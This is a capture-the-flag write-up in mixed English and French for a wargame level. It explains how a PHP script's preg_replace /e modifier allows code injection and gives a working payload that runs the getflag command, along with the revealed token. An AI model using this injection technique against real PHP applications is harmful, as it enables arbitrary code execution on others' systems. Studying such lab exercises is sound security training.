We find in the **home** folder a binary named **level06** and a php file named **level06.php** containing the following code :
```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);	# Replace "x" with "x"
	$m = preg_replace("/@/", " y", $m);	# Replace @ with " y"
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	# The modifier /e takes a replacement string, and substitutes the backslash followed by a number.
	# and executes the resulting string as if it were PHP code
	$a = preg_replace("/\[/", "(", $a);
	# Reaokce [ with (
	$a = preg_replace("/\]/", ")", $a);
	# Reaokce ) with )
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```
> The interesting part in the code is <code>/(\[x (.*)\])/e</code> because the **preg_replace** uses the *modifier* **/e** or **(PREG_REPLACE_EVAL)**, which is known to be sensitive to injections (It doesn't even exist in PHP 7.0.0 anymore).

On comprend que le format pour la string recupérée du <code>file_get_contents</code> doit être formatée de la manière suivante:

<code>/(\[x (.*)\])/e => [x {${INJECTION}}]</code>

Injection allows to replace the <code>(.*)</code> with a command, such as **getflag** :

<pre><code>> echo '[x {${exec(getflag)}}]' > /tmp/inject
> ./level06 /tmp/inject
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
</code></pre>

